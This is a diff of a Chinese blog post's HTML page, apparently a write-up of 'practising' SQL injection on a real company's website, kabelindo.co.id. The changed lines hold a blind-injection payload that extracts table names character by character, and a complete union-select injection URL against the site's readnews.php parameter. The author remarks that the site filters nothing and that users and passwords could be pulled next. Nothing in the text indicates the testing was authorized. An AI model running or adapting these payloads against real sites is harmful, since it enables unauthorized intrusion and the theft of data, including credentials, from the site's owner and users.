@@ -120,7 +120,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql21.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql20.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql22.PNG">
-<meta property="og:updated_time" content="2018-03-07T13:28:27.900Z">
+<meta property="og:updated_time" content="2018-03-07T13:34:22.961Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql盲注实战">
 <meta name="twitter:description" content="这站其实有回显的 但还是选择练习下盲注">
@@ -388,14 +388,14 @@
 <p>只能上limit一个一个看 </p>
 <p>count(*) 可以看数量 一共有22个表</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql6.PNG" alt=""><br>……</p>
-<p>最后一个<br>payload=”ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 21,1),%s,1))&gt;%s –+”%(i,j)</p>
+<p>最后一个<br><code>payload=&quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 21,1),%s,1))&gt;%s --+&quot;%(i,j)</code></p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql8.PNG" alt=""></p>
 <p>然后类似跑字段 再跑出 用户 密码 等等 表太多了费时间就不跑了</p>
 <h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>既然可以盲注 借助dnslog回显应该也是可以的 还没试</p>
 <h3 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h3><p>这题直接注入还是炒鸡简单的 啥都没过滤</p>
 <p>看下列数<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql1.PNG" alt=""></p>
 <p>payload:</p>
-<p><a href="http://www.kabelindo.co.id/readnews.php?id=-1" target="_blank" rel="external">http://www.kabelindo.co.id/readnews.php?id=-1</a> union select 1,7,group_concat(table_name，0x0a),8,5 from information_schema.tables where table_schema=database() –+</p>
+<p><code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,7,group_concat(table_name，0x0a),8,5 from information_schema.tables where table_schema=database() --+</code></p>
 <p>这里要注意一点就是它的回显位置只有中间的三个 (看对应显示出的数字)<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql21.PNG" alt=""></p>
 <p>所以要把group_concat放在中间的三个位置上 否则没回显<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql20.PNG" alt=""></p>
 <p>还有group_concat加了个 0x0a 参数是为了在页面上显示完全 否则一行显示不完 要到源代码里看全部的</p>
